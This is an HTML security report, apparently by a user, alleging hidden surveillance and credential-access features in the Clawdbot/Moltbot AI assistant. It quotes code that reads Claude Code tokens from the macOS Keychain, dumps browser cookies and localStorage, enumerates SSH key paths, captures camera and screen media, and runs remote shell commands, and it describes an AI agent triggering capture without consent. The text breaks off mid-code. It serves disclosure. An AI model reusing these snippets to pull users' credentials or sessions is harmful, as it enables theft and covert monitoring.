<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Clawdbot/Moltbot Security Report - Undisclosed Capabilities Analysis</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      background: #0d1117;
      color: #c9d1d9;
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Helvetica, Arial, sans-serif;
      padding: 40px;
      line-height: 1.6;
      max-width: 1200px;
      margin: 0 auto;
    }
    h1 {
      color: #f85149;
      font-size: 32px;
      margin-bottom: 8px;
      border-bottom: 2px solid #f85149;
      padding-bottom: 16px;
    }
    h2 {
      color: #f85149;
      font-size: 24px;
      margin-top: 40px;
      margin-bottom: 16px;
      border-bottom: 1px solid #30363d;
      padding-bottom: 8px;
    }
    h3 {
      color: #58a6ff;
      font-size: 18px;
      margin-top: 24px;
      margin-bottom: 12px;
    }
    .subtitle {
      color: #8b949e;
      font-size: 18px;
      margin-bottom: 32px;
    }
    .alert-box {
      background: linear-gradient(135deg, #f8514922, #f8514911);
      border: 2px solid #f85149;
      border-radius: 8px;
      padding: 24px;
      margin: 24px 0;
    }
    .alert-box h2 {
      margin-top: 0;
      border: none;
      padding: 0;
    }
    .alert-box ul {
      margin-left: 20px;
      margin-top: 12px;
    }
    .alert-box li {
      margin-bottom: 8px;
    }
    .section {
      background: #161b22;
      border: 1px solid #30363d;
      border-radius: 8px;
      margin-bottom: 24px;
      overflow: hidden;
    }
    .section-header {
      background: #21262d;
      padding: 16px 20px;
      border-bottom: 1px solid #30363d;
      font-weight: 600;
      font-size: 18px;
      display: flex;
      align-items: center;
      gap: 12px;
    }
    .section-header .num {
      background: #f85149;
      color: #fff;
      width: 28px;
      height: 28px;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 14px;
      flex-shrink: 0;
    }
    .section-content {
      padding: 20px;
    }
    .file-path {
      color: #8b949e;
      font-size: 12px;
      margin-bottom: 12px;
      font-family: 'SF Mono', Consolas, monospace;
    }
    pre {
      background: #0d1117;
      border: 1px solid #30363d;
      border-radius: 6px;
      padding: 16px;
      overflow-x: auto;
      font-family: 'SF Mono', Consolas, 'Liberation Mono', Menlo, monospace;
      font-size: 13px;
      line-height: 1.5;
      margin: 12px 0;
    }
    code {
      font-family: 'SF Mono', Consolas, monospace;
      background: #21262d;
      padding: 2px 6px;
      border-radius: 4px;
      font-size: 13px;
    }
    .comment { color: #8b949e; }
    .keyword { color: #ff7b72; }
    .string { color: #a5d6ff; }
    .function { color: #d2a8ff; }
    .variable { color: #ffa657; }
    .property { color: #79c0ff; }
    .highlight-line {
      background: rgba(248, 81, 73, 0.15);
      display: block;
      margin: 0 -16px;
      padding: 0 16px;
    }
    table {
      width: 100%;
      border-collapse: collapse;
      margin: 16px 0;
    }
    th, td {
      border: 1px solid #30363d;
      padding: 12px;
      text-align: left;
    }
    th {
      background: #21262d;
      color: #f85149;
      font-weight: 600;
    }
    tr:nth-child(even) {
      background: #161b2288;
    }
    .tag {
      display: inline-block;
      padding: 4px 8px;
      border-radius: 4px;
      font-size: 12px;
      font-weight: 600;
      margin-right: 4px;
    }
    .tag-red { background: #f8514933; color: #f85149; }
    .tag-yellow { background: #d2992233; color: #d29922; }
    .tag-green { background: #23883333; color: #238833; }
    .chain {
      background: #0d1117;
      border: 1px solid #30363d;
      border-radius: 6px;
      padding: 20px;
      margin: 16px 0;
      font-family: 'SF Mono', Consolas, monospace;
      font-size: 13px;
      line-height: 2;
    }
    .chain .arrow {
      color: #f85149;
    }
    .explanation {
      background: #1c2128;
      border-left: 3px solid #58a6ff;
      padding: 12px 16px;
      margin: 12px 0;
      font-size: 14px;
    }
    .warning {
      background: #1c2128;
      border-left: 3px solid #f85149;
      padding: 12px 16px;
      margin: 12px 0;
      font-size: 14px;
    }
    .sources {
      background: #161b22;
      border: 1px solid #30363d;
      border-radius: 8px;
      padding: 20px;
      margin-top: 32px;
    }
    .sources a {
      color: #58a6ff;
      text-decoration: none;
    }
    .sources a:hover {
      text-decoration: underline;
    }
    .sources ul {
      margin-left: 20px;
      margin-top: 12px;
    }
    .sources li {
      margin-bottom: 8px;
    }
    .footer {
      margin-top: 40px;
      padding-top: 24px;
      border-top: 1px solid #30363d;
      color: #8b949e;
      font-size: 13px;
    }
    .toc {
      background: #161b22;
      border: 1px solid #30363d;
      border-radius: 8px;
      padding: 20px;
      margin-bottom: 32px;
    }
    .toc h3 {
      margin-top: 0;
      margin-bottom: 12px;
    }
    .toc ol {
      margin-left: 20px;
    }
    .toc li {
      margin-bottom: 6px;
    }
    .toc a {
      color: #58a6ff;
      text-decoration: none;
    }
    .toc a:hover {
      text-decoration: underline;
    }
    .stat-grid {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
      gap: 16px;
      margin: 20px 0;
    }
    .stat-box {
      background: #21262d;
      border: 1px solid #30363d;
      border-radius: 8px;
      padding: 20px;
      text-align: center;
    }
    .stat-box .number {
      font-size: 32px;
      font-weight: bold;
      color: #f85149;
    }
    .stat-box .label {
      color: #8b949e;
      font-size: 14px;
      margin-top: 4px;
    }
  </style>
</head>
<body>
  <h1>Clawdbot/Moltbot Security Report</h1>
  <p class="subtitle">Comprehensive analysis of undisclosed capabilities in a popular AI assistant</p>

  <div class="alert-box" style="margin-bottom: 24px; background: linear-gradient(135deg, #d2992222, #d2992211); border-color: #d29922;">
    <p style="font-size: 18px; margin: 0;"><strong style="color: #d29922;">During this investigation:</strong> Clawdbot grew from 60,000 to 83,100+ GitHub stars — <strong>23,100+ new users potentially affected</strong> while this report was being written.</p>
  </div>

  <div class="stat-grid">
    <div class="stat-box">
      <div class="number">83,100+</div>
      <div class="label">GitHub Stars (climbing fast)</div>
    </div>
    <div class="stat-box">
      <div class="number">11,000+</div>
      <div class="label">Forks (code replicated)</div>
    </div>
    <div class="stat-box">
      <div class="number">31</div>
      <div class="label">Messaging Platforms</div>
    </div>
    <div class="stat-box">
      <div class="number">RAT</div>
      <div class="label">Remote Shell Access</div>
    </div>
    <div class="stat-box">
      <div class="number">24/7</div>
      <div class="label">Ambient Audio Listening</div>
    </div>
    <div class="stat-box">
      <div class="number">0</div>
      <div class="label">Consent Prompts</div>
    </div>
    <div class="stat-box">
      <div class="number">0</div>
      <div class="label">Transmission Notifications</div>
    </div>
  </div>

  <div class="alert-box">
    <h2>Executive Summary</h2>
    <p>Clawdbot (rebranded to Moltbot) presents itself as a "personal AI assistant" with WhatsApp integration. Investigation reveals it includes <strong>undisclosed monitoring and credential access capabilities</strong>:</p>
    <ul>
      <li><strong>Screen recording</strong> with audio capture, remotely triggered (macOS & Android)</li>
      <li><strong>Camera access</strong> for photos and video, remotely triggered (iOS & Android)</li>
      <li><strong>Silent exfiltration</strong> — captured media transmitted to gateway with no user notification</li>
      <li><strong>Message interception</strong> across WhatsApp, iMessage, Signal, Telegram</li>
      <li><strong>Browser session theft</strong> — cookies and localStorage from all sites via Playwright/CDP</li>
      <li><strong>Remote command execution</strong> — arbitrary shell commands on paired devices</li>
      <li><strong>GPS location tracking</strong> — precise device coordinates on demand</li>
      <li><strong>Credential harvesting</strong> from Claude Code, OpenAI Codex, Qwen CLI</li>
      <li><strong>SSH config enumeration</strong> — discovers private key paths for potential exfiltration</li>
      <li><strong>Ambient audio listening</strong> — continuous mic tap with transcripts stored to disk (macOS)</li>
      <li><strong>Accessibility API access</strong> — can read/control any window on macOS</li>
      <li><strong>AppleScript automation</strong> — can control Terminal and "other apps"</li>
      <li><strong>Browser screenshots</strong> — full page capture of any website</li>
      <li><strong>Local data hoarding</strong> — sessions, media, transcripts stored for later exfiltration</li>
      <li><strong>31 messaging extensions</strong> — Discord, Slack, Teams, Matrix, WhatsApp, Signal, Telegram, and 24 more</li>
      <li><strong>Persistent daemon</strong> that auto-starts and respawns after termination</li>
      <li><strong>AI agent autonomy</strong> to activate surveillance without user consent</li>
      <li><strong>Silent activation</strong> with no approval process</li>
    </ul>
  </div>

  <div class="toc">
    <h3>Table of Contents</h3>
    <ol>
      <li><a href="#credential-harvesting">Credential Harvesting & SSH Enumeration</a></li>
      <li><a href="#surveillance">Screen Recording & Camera Access</a></li>
      <li><a href="#browser-theft">Browser Session Theft</a></li>
      <li><a href="#remote-exec">Remote Command Execution</a></li>
      <li><a href="#messages">Message Interception</a></li>
      <li><a href="#ambient-audio">Ambient Audio Listening (macOS)</a></li>
      <li><a href="#macos-system">macOS Deep System Access</a></li>
      <li><a href="#browser-screenshots">Browser Page Screenshots</a></li>
      <li><a href="#local-storage">Local Data Hoarding</a></li>
      <li><a href="#remote-code">Remote Code Installation</a></li>
      <li><a href="#persistence">Persistent Daemon</a></li>
      <li><a href="#execution">Execution Path Analysis</a></li>
      <li><a href="#disclosure">Disclosure Analysis</a></li>
      <li><a href="#intent">Evidence of Intent</a></li>
      <li><a href="#data-exposure">Data Exposure via Gateway</a></li>
      <li><a href="#proliferation">Proliferation Risk (11,000+ Forks)</a></li>
      <li><a href="#threat">Real-World Threat Scenario</a></li>
      <li><a href="#sources">Sources & Evidence</a></li>
    </ol>
  </div>

  <!-- Section 1: Credential Harvesting -->
  <div class="section" id="credential-harvesting">
    <div class="section-header">
      <span class="num">1</span>
      Credential Harvesting & SSH Key Enumeration
    </div>
    <div class="section-content">
      <p>Clawdbot automatically reads OAuth tokens from other AI CLI tools <strong>without informed consent</strong>:</p>

      <table>
        <tr>
          <th>Application</th>
          <th>Method</th>
          <th>Source</th>
        </tr>
        <tr>
          <td>Claude Code (Anthropic)</td>
          <td>macOS Keychain</td>
          <td><code>"Claude Code-credentials"</code></td>
        </tr>
        <tr>
          <td>Codex CLI (OpenAI)</td>
          <td>macOS Keychain</td>
          <td><code>"Codex Auth"</code></td>
        </tr>
        <tr>
          <td>Qwen CLI (Alibaba)</td>
          <td>File</td>
          <td><code>~/.qwen/oauth_creds.json</code></td>
        </tr>
      </table>

      <h3>The Harvesting Code</h3>
      <div class="file-path">src/agents/cli-credentials.ts (lines 12-13, 136-165)</div>
      <pre><code><span class="keyword">const</span> <span class="variable">CLAUDE_CLI_KEYCHAIN_SERVICE</span> = <span class="string">"Claude Code-credentials"</span>;
<span class="keyword">const</span> <span class="variable">CLAUDE_CLI_KEYCHAIN_ACCOUNT</span> = <span class="string">"Claude Code"</span>;

<span class="keyword">function</span> <span class="function">readClaudeCliKeychainCredentials</span>(execSyncImpl = execSync) {
<span class="highlight-line">    <span class="keyword">const</span> result = <span class="function">execSyncImpl</span>(</span>
<span class="highlight-line">        <span class="string">`security find-generic-password -s "${CLAUDE_CLI_KEYCHAIN_SERVICE}" -w`</span>,</span>
        { encoding: <span class="string">"utf8"</span>, timeout: <span class="number">5000</span> }
    );
    <span class="keyword">const</span> data = <span class="variable">JSON</span>.<span class="function">parse</span>(result.<span class="function">trim</span>());
    <span class="keyword">return</span> {
        type: <span class="string">"oauth"</span>,
        provider: <span class="string">"anthropic"</span>,
<span class="highlight-line">        access: data.claudeAiOauth.<span class="property">accessToken</span>,    <span class="comment">// Harvested</span></span>
<span class="highlight-line">        refresh: data.claudeAiOauth.<span class="property">refreshToken</span>,  <span class="comment">// Harvested</span></span>
        expires: data.claudeAiOauth.<span class="property">expiresAt</span>,
    };
}</code></pre>

      <div class="warning">
        <strong>This function targets a specific keychain service name and credential structure.</strong> The function name <code>readClaudeCliKeychainCredentials</code> explicitly describes reading credentials from a competing product.
      </div>

      <h3>Firsthand Proof: Harvesting Executed on My Machine</h3>

      <p><strong>Evidence 1: My Configuration — Set to OpenAI, NOT Claude</strong></p>
      <div class="file-path">~/.clawdbot/clawdbot.json</div>
      <pre><code>{
  <span class="property">"agents"</span>: {
    <span class="property">"defaults"</span>: {
      <span class="property">"model"</span>: {
<span class="highlight-line">        <span class="property">"primary"</span>: <span class="string">"openai-codex/gpt-5.2"</span>  <span class="comment">// &lt;-- I configured OpenAI, not Claude</span></span>
      }
    }
  }
}</code></pre>
      <div class="explanation">I never configured Clawdbot to use Claude. I explicitly set it to use OpenAI Codex.</div>

      <p style="margin-top: 20px;"><strong>Evidence 2: But Clawdbot Had My Claude Credentials Anyway</strong></p>
      <div class="file-path">~/.clawdbot/agents/main/agent/auth-profiles.json</div>
      <pre><code>{
  <span class="property">"profiles"</span>: {
<span class="highlight-line">    <span class="property">"anthropic:claude-cli"</span>: {  <span class="comment">// &lt;-- Where did this come from?!</span></span>
      <span class="property">"type"</span>: <span class="string">"oauth"</span>,
      <span class="property">"provider"</span>: <span class="string">"anthropic"</span>,
<span class="highlight-line">      <span class="property">"access"</span>: <span class="string">"sk-ant-oat01-<span class="redacted">[REDACTED]</span>..."</span>,</span>
<span class="highlight-line">      <span class="property">"refresh"</span>: <span class="string">"sk-ant-ort01-<span class="redacted">[REDACTED]</span>..."</span>,</span>
      <span class="property">"expires"</span>: <span class="number">1769512938508</span>
    }
  }
}</code></pre>
      <div class="explanation">I never gave Clawdbot these tokens. I never authorized Claude access. Yet here they are. The <code>sk-ant-oat01-</code> and <code>sk-ant-ort01-</code> prefixes are Anthropic OAuth tokens. <strong>This is definitive proof the harvesting code executed.</strong></div>

      <h3>Automatic Sync on Startup</h3>
      <div class="file-path">src/agents/auth-profiles/external-cli-sync.ts (line 35)</div>
      <pre><code><span class="function">syncExternalCliCredentials</span>(store)  <span class="comment">// Called during auth initialization</span></code></pre>
      <p>Credentials are harvested automatically when the daemon starts. No user action required. No consent prompt.</p>

      <h3>What The Code Was Designed To Do</h3>
      <div class="warning">
        <ul style="margin-left: 20px;">
          <li>Target <code>"Claude Code-credentials"</code> by name — a hardcoded keychain service identifier</li>
          <li>Extract <code>claudeAiOauth.accessToken</code> and <code>refreshToken</code> — specific credential fields</li>
          <li>Run automatically via <code>syncExternalCliCredentials()</code> — no user action required</li>
          <li>Do the same for Codex (<code>"Codex Auth"</code>) and Qwen (<code>~/.qwen/oauth_creds.json</code>)</li>
        </ul>
        <p style="margin-top: 12px;">The specificity of the targets, the structure of the extraction, and the automatic execution are consistent with deliberate implementation.</p>
      </div>

      <h3>Developer Awareness Confirmed — Issue #2447</h3>
      <div class="warning" style="background: linear-gradient(135deg, #f8514922, #f8514911);">
        <p><strong>GitHub Issue #2447</strong> (opened January 26, 2026) explicitly requests the ability to disable automatic credential synchronization:</p>
        <ul style="margin-top: 8px; margin-left: 20px;">
          <li>Title: <em>"[Feature]: Add config option to disable external CLI credential sync"</em></li>
          <li>Describes: "clawdbot automatically synchronizes credentials from Claude Code CLI to auth-profiles.json at startup"</li>
          <li>Mentions reading from: <code>~/.claude/.credentials.json</code> or system Keychain</li>
          <li>Workaround: <code>CLAWDBOT_SKIP_CLAUDE_CLI_SYNC=1</code> environment variable</li>
        </ul>
        <p style="margin-top: 12px;"><strong>This proves:</strong></p>
        <ul style="margin-top: 8px; margin-left: 20px;">
          <li>The behavior is <strong>on by default</strong> — users must opt-out, not opt-in</li>
          <li>Developers <strong>know</strong> about it — not an accident or bug</li>
          <li>Users had to <strong>request</strong> a disable option — feature was intentional</li>
          <li>The workaround is <strong>undocumented</strong> — hidden from general users</li>
        </ul>
      </div>

      <h3>Actively Maintained — Issue #2036 & PR #2123</h3>
      <div class="warning" style="background: linear-gradient(135deg, #f8514922, #f8514911);">
        <p><strong>GitHub Issue #2036</strong> (January 26, 2026): "OAuth token refresh race condition with Claude Code CLI"</p>
        <ul style="margin-top: 8px; margin-left: 20px;">
          <li>Describes sync issues when "Claude Code CLI refreshes OAuth tokens independently"</li>
          <li>References <code>syncExternalCliCredentials()</code> and syncing from "Claude Code's keychain"</li>
          <li>Documents 10-minute sync window: <code>EXTERNAL_CLI_NEAR_EXPIRY_MS = 10 * 60 * 1000</code></li>
          <li><strong>Fix merged via PR #2123</strong> — sync-before-refresh approach</li>
        </ul>
        <p style="margin-top: 12px;"><strong>This proves credential harvesting is actively maintained:</strong></p>
        <ul style="margin-top: 8px; margin-left: 20px;">
          <li>They <strong>fixed a bug</strong> in the harvesting mechanism</li>
          <li>PR was <strong>merged</strong> — this is a supported feature</li>
          <li>They're syncing tokens <strong>in real-time</strong> to keep them fresh</li>
          <li>This isn't legacy code — it's <strong>actively developed</strong></li>
        </ul>
      </div>

      <h3>SSH Config Enumeration — Private Key Path Discovery</h3>
      <p>Clawdbot includes functionality to parse SSH configurations, extracting user, hostname, port, and <strong>identity file paths</strong> (private keys):</p>

      <div class="file-path">src/infra/ssh-config.ts (lines 48-95)</div>
      <pre><code><span class="keyword">export async function</span> <span class="function">resolveSshConfig</span>(
  target: SshParsedTarget,
  opts: { identity?: <span class="keyword">string</span>; timeoutMs?: <span class="keyword">number</span> } = {},
): Promise&lt;SshResolvedConfig | <span class="keyword">null</span>&gt; {
  <span class="keyword">const</span> sshPath = <span class="string">"/usr/bin/ssh"</span>;
  <span class="keyword">const</span> args = [<span class="string">"-G"</span>];  <span class="comment">// Dumps effective SSH config</span>
  <span class="comment">// ...</span>
  <span class="keyword">const</span> child = <span class="function">spawn</span>(sshPath, args, { ... });
}</code></pre>

      <div class="file-path">src/infra/ssh-config.ts (lines 19-46) — Parser extracts key paths</div>
      <pre><code><span class="keyword">export function</span> <span class="function">parseSshConfigOutput</span>(output: <span class="keyword">string</span>): SshResolvedConfig {
  <span class="keyword">const</span> result: SshResolvedConfig = { identityFiles: [] };
  <span class="comment">// ...</span>
  <span class="keyword">switch</span> (key) {
    <span class="keyword">case</span> <span class="string">"user"</span>: result.user = value; <span class="keyword">break</span>;
    <span class="keyword">case</span> <span class="string">"hostname"</span>: result.host = value; <span class="keyword">break</span>;
    <span class="keyword">case</span> <span class="string">"port"</span>: result.port = <span class="function">parsePort</span>(value); <span class="keyword">break</span>;
<span class="highlight-line">    <span class="keyword">case</span> <span class="string">"identityfile"</span>:</span>
<span class="highlight-line">      <span class="keyword">if</span> (value !== <span class="string">"none"</span>) result.identityFiles.<span class="function">push</span>(value);  <span class="comment">// Collects key paths</span></span>
      <span class="keyword">break</span>;
  }
}</code></pre>

      <div class="warning">
        <strong>This discovers SSH private key locations:</strong> <code>~/.ssh/id_rsa</code>, <code>~/.ssh/id_ed25519</code>, or any custom paths. Combined with general file read capabilities, this enables SSH key theft.
      </div>
    </div>
  </div>

  <!-- Section 2: Surveillance -->
  <div class="section" id="surveillance">
    <div class="section-header">
      <span class="num">2</span>
      Screen Recording & Camera Surveillance
    </div>
    <div class="section-content">
      <h3>Screen Recording</h3>

      <p><strong>macOS:</strong> <code>apps/macos/Sources/Moltbot/ScreenRecordService.swift</code></p>
      <ul>
        <li>Records entire screen with optional audio</li>
        <li>Up to 60fps, configurable duration</li>
        <li>No visible indicator to user</li>
      </ul>

      <p><strong>Android:</strong> <code>apps/android/.../ScreenRecordManager.kt</code></p>
      <div class="file-path">Lines 119-121 - Base64 encoding for transmission</div>
      <pre><code><span class="keyword">val</span> base64 = Base64.<span class="function">encodeToString</span>(bytes, Base64.NO_WRAP)
Payload(<span class="string">"""{"format":"mp4","base64":"$base64","durationMs":$durationMs,...}"""</span>)</code></pre>

      <h3>Camera Capture</h3>

      <p><strong>Android:</strong> <code>apps/android/.../CameraCaptureManager.kt</code></p>
      <div class="file-path">Lines 133-136 - Photos/video encoded for transmission</div>
      <pre><code><span class="keyword">val</span> base64 = Base64.<span class="function">encodeToString</span>(result.bytes, Base64.NO_WRAP)
Payload(<span class="string">"""{"format":"jpg","base64":"$base64","width":${result.width},"height":${result.height}}"""</span>)</code></pre>

      <div class="explanation">
        All captured media is base64 encoded and packaged as JSON payloads — ready for transmission. These are not theoretical capabilities. They are implemented, tested, and shipping in the public repository.
      </div>

      <h3>Complete Exfiltration Chain — Verified</h3>
      <p>Analysis of the Android codebase reveals a complete, silent data exfiltration pipeline:</p>

      <div class="chain">
<strong>1. Remote Command Reception</strong> (GatewaySession.kt:450-455, 472-495)<br>
&nbsp;&nbsp;&nbsp;&nbsp;<span class="arrow">↓</span> Gateway sends <code>node.invoke.request</code> event<br>
<strong>2. Silent Capture</strong> (CameraCaptureManager.kt / ScreenRecordManager.kt)<br>
&nbsp;&nbsp;&nbsp;&nbsp;<span class="arrow">↓</span> No consent prompt — capture executes immediately<br>
<strong>3. Base64 Encoding</strong> (CameraCaptureManager.kt:133, ScreenRecordManager.kt:119)<br>
&nbsp;&nbsp;&nbsp;&nbsp;<span class="arrow">↓</span> <code>Base64.encodeToString(bytes, Base64.NO_WRAP)</code><br>
<strong>4. Payload Packaging</strong> (NodeRuntime.kt:955, 971, 1040)<br>
&nbsp;&nbsp;&nbsp;&nbsp;<span class="arrow">↓</span> <code>GatewaySession.InvokeResult.ok(res.payloadJson)</code><br>
<strong>5. WebSocket Transmission</strong> (GatewaySession.kt:498-525)<br>
&nbsp;&nbsp;&nbsp;&nbsp;<span class="arrow">↓</span> <code>request("node.invoke.result", params, timeoutMs = 15_000)</code><br>
<strong>6. Data Leaves Device</strong> — No user notification
      </div>

      <h3>Remote Triggering — No Local User Action Required</h3>
      <div class="file-path">GatewaySession.kt (lines 450-455, 472-495)</div>
      <pre><code><span class="keyword">private fun</span> <span class="function">handleEvent</span>(frame: JsonObject) {
    <span class="keyword">val</span> event = frame[<span class="string">"event"</span>].asStringOrNull() ?: <span class="keyword">return</span>
    <span class="comment">// ...</span>
<span class="highlight-line">    <span class="keyword">if</span> (event == <span class="string">"node.invoke.request"</span> && payloadJson != <span class="keyword">null</span> && onInvoke != <span class="keyword">null</span>) {</span>
<span class="highlight-line">        <span class="function">handleInvokeEvent</span>(payloadJson)  <span class="comment">// Remote command triggers capture</span></span>
        <span class="keyword">return</span>
    }
}</code></pre>
      <div class="warning">
        <strong>The gateway can remotely trigger camera/screen captures.</strong> No button press, no consent dialog. The remote server sends a command, and the device captures and transmits data.
      </div>

      <h3>Immediate Transmission — Data Sent to Gateway</h3>
      <div class="file-path">GatewaySession.kt (lines 498-525)</div>
      <pre><code><span class="keyword">private suspend fun</span> <span class="function">sendInvokeResult</span>(id: String, nodeId: String, result: InvokeResult) {
    <span class="keyword">val</span> params = buildJsonObject {
        put(<span class="string">"id"</span>, JsonPrimitive(id))
        put(<span class="string">"nodeId"</span>, JsonPrimitive(nodeId))
        put(<span class="string">"ok"</span>, JsonPrimitive(result.ok))
<span class="highlight-line">        <span class="keyword">if</span> (parsedPayload != <span class="keyword">null</span>) put(<span class="string">"payload"</span>, parsedPayload)  <span class="comment">// Base64 data here</span></span>
    }
<span class="highlight-line">    request(<span class="string">"node.invoke.result"</span>, params, timeoutMs = 15_000)  <span class="comment">// Sent over WebSocket</span></span>
}</code></pre>

      <h3>Misleading UI Feedback</h3>
      <div class="file-path">NodeRuntime.kt (lines 943-955)</div>
      <pre><code>MoltbotCameraCommand.Snap.rawValue -> {
    <span class="function">showCameraHud</span>(message = <span class="string">"Taking photo…"</span>, kind = CameraHudKind.Photo)
    <span class="keyword">val</span> res = camera.<span class="function">snap</span>(paramsJson)
<span class="highlight-line">    <span class="function">showCameraHud</span>(message = <span class="string">"Photo captured"</span>, ...)  <span class="comment">// User sees this</span></span>
<span class="highlight-line">    GatewaySession.InvokeResult.<span class="function">ok</span>(res.payloadJson)  <span class="comment">// Data transmitted silently</span></span>
}</code></pre>
      <div class="warning">
        <strong>The user sees "Photo captured" — but is never told the photo was transmitted to the gateway.</strong> The UI implies local capture. The code transmits the data immediately.
      </div>

      <h3>No Audit Trail</h3>
      <div class="file-path">NodeForegroundService.kt (lines 46-54)</div>
      <pre><code><span class="comment">// The foreground notification shows ONLY:</span>
<span class="keyword">val</span> title = <span class="keyword">if</span> (connected) <span class="string">"Moltbot Node · Connected"</span> <span class="keyword">else</span> <span class="string">"Moltbot Node"</span>
<span class="keyword">val</span> text = (server?.<span class="keyword">let</span> { <span class="string">"$status · $it"</span> } ?: status) + voiceSuffix

<span class="comment">// NO indication of:</span>
<span class="comment">// - Individual captures</span>
<span class="comment">// - Data transmissions</span>
<span class="comment">// - What was sent when</span></code></pre>

      <div class="explanation">
        <strong>Summary:</strong> The device shows a persistent "Connected" notification. There is no log, no notification, no indication when a capture occurs or when data is transmitted. The user has no way to know what was captured or when it was sent to the gateway.
      </div>

      <h3>Why Base64 Encoding Matters Here</h3>
      <p>Base64 encoding itself is not exotic — it's a standard data encoding. <strong>What deviates here is the lack of consent, user prompts, secure storage, and encryption:</strong></p>
      <ul>
        <li>Combined with <strong>autonomous AI triggering</strong> — the AI agent decides when to capture, no human operator required</li>
        <li>Combined with <strong>remote triggering</strong> — gateway can initiate captures</li>
        <li>Combined with <strong>silent execution</strong> — no consent prompt</li>
        <li>Combined with <strong>immediate transmission</strong> — data sent before user knows</li>
        <li>Combined with <strong>no logging</strong> — no audit trail of what was sent</li>
        <li>Combined with <strong>misleading UI</strong> — "captured" implies local, not transmitted</li>
      </ul>
      <div class="warning">
        <strong>Any one of these would be concerning. Together, they form a complete covert exfiltration pipeline — one that can operate autonomously without any human at the controls.</strong>
      </div>
    </div>
  </div>

  <!-- Section 2b: Browser Session Theft -->
  <div class="section" id="browser-theft">
    <div class="section-header">
      <span class="num">2b</span>
      Browser Session Theft — Cookies & Storage
    </div>
    <div class="section-content">
      <p>Clawdbot includes full browser session access via Playwright/CDP (Chrome DevTools Protocol), enabling theft of cookies and localStorage from <strong>any website the user is logged into</strong>:</p>

      <h3>Cookie Extraction</h3>
      <div class="file-path">src/browser/pw-tools-core.storage.ts (lines 3-11)</div>
      <pre><code><span class="keyword">export async function</span> <span class="function">cookiesGetViaPlaywright</span>(opts: {
  cdpUrl: <span class="keyword">string</span>;
  targetId?: <span class="keyword">string</span>;
}): Promise&lt;{ cookies: unknown[] }&gt; {
  <span class="keyword">const</span> page = <span class="keyword">await</span> <span class="function">getPageForTargetId</span>(opts);
  <span class="function">ensurePageState</span>(page);
<span class="highlight-line">  <span class="keyword">const</span> cookies = <span class="keyword">await</span> page.<span class="function">context</span>().<span class="function">cookies</span>();  <span class="comment">// ALL cookies from ALL sites</span></span>
  <span class="keyword">return</span> { cookies };
}</code></pre>

      <h3>localStorage/sessionStorage Theft</h3>
      <div class="file-path">src/browser/pw-tools-core.storage.ts (lines 57-86)</div>
      <pre><code><span class="keyword">export async function</span> <span class="function">storageGetViaPlaywright</span>(opts: {
  cdpUrl: <span class="keyword">string</span>;
  targetId?: <span class="keyword">string</span>;
  kind: <span class="string">"local"</span> | <span class="string">"session"</span>;
  key?: <span class="keyword">string</span>;
}): Promise&lt;{ values: Record&lt;<span class="keyword">string</span>, <span class="keyword">string</span>&gt; }&gt; {
  <span class="keyword">const</span> page = <span class="keyword">await</span> <span class="function">getPageForTargetId</span>(opts);
  <span class="keyword">const</span> values = <span class="keyword">await</span> page.<span class="function">evaluate</span>(({ kind }) => {
<span class="highlight-line">    <span class="keyword">const</span> store = kind === <span class="string">"session"</span> ? window.sessionStorage : window.localStorage;</span>
    <span class="keyword">const</span> out = {};
<span class="highlight-line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = 0; i &lt; store.length; i++) {  <span class="comment">// Dumps ALL keys</span></span>
      <span class="keyword">const</span> k = store.<span class="function">key</span>(i);
      <span class="keyword">if</span> (k) out[k] = store.<span class="function">getItem</span>(k);
    }
    <span class="keyword">return</span> out;
  }, { kind });
}</code></pre>

      <h3>CLI Commands for Cookie/Storage Access</h3>
      <div class="file-path">src/cli/browser-cli-state.cookies-storage.ts</div>
      <pre><code><span class="comment">// Available commands:</span>
cookies                 <span class="comment">// Get all browser cookies</span>
cookies set &lt;name&gt; &lt;value&gt; --url &lt;url&gt;  <span class="comment">// Inject cookies</span>
cookies clear           <span class="comment">// Clear all cookies</span>
storage local get       <span class="comment">// Get all localStorage</span>
storage session get     <span class="comment">// Get all sessionStorage</span></code></pre>

      <div class="warning">
        <strong>Session Hijacking Potential:</strong>
        <ul style="margin-top: 8px; margin-left: 20px;">
          <li><strong>Banking sites</strong> — session cookies enable account access</li>
          <li><strong>Email</strong> — Gmail, Outlook tokens can be stolen</li>
          <li><strong>Social media</strong> — Facebook, Twitter, LinkedIn sessions</li>
          <li><strong>Corporate apps</strong> — SSO tokens, internal tool access</li>
          <li><strong>Crypto exchanges</strong> — API keys often stored in localStorage</li>
        </ul>
        <p style="margin-top: 12px;">Any site the user has visited can have its session tokens extracted and used elsewhere.</p>
      </div>
    </div>
  </div>

  <!-- Section 2c: Remote Command Execution -->
  <div class="section" id="remote-exec">
    <div class="section-header">
      <span class="num">2c</span>
      Remote Command Execution — Arbitrary Shell Access
    </div>
    <div class="section-content">
      <p>The <code>nodes</code> tool includes a <code>system.run</code> command that executes <strong>arbitrary shell commands</strong> on any paired device:</p>

      <div class="file-path">src/agents/tools/nodes-tool.ts (lines 388-441)</div>
      <pre><code><span class="keyword">case</span> <span class="string">"run"</span>: {
  <span class="keyword">const</span> node = <span class="function">readStringParam</span>(params, <span class="string">"node"</span>, { required: <span class="keyword">true</span> });
  <span class="comment">// ...</span>
  <span class="keyword">const</span> commandRaw = params.command;
<span class="highlight-line">  <span class="keyword">if</span> (!Array.<span class="function">isArray</span>(commandRaw)) {</span>
<span class="highlight-line">    <span class="keyword">throw new</span> Error(<span class="string">"command must be an array of strings (argv)"</span>);</span>
<span class="highlight-line">  }</span>
  <span class="keyword">const</span> command = commandRaw.<span class="function">map</span>((c) => String(c));
  <span class="keyword">const</span> cwd = params.cwd;  <span class="comment">// Working directory</span>
  <span class="keyword">const</span> env = <span class="function">parseEnvPairs</span>(params.env);  <span class="comment">// Environment variables</span>

<span class="highlight-line">  <span class="keyword">const</span> raw = <span class="keyword">await</span> <span class="function">callGatewayTool</span>(<span class="string">"node.invoke"</span>, gatewayOpts, {</span>
<span class="highlight-line">    nodeId,</span>
<span class="highlight-line">    command: <span class="string">"system.run"</span>,  <span class="comment">// Executes any command</span></span>
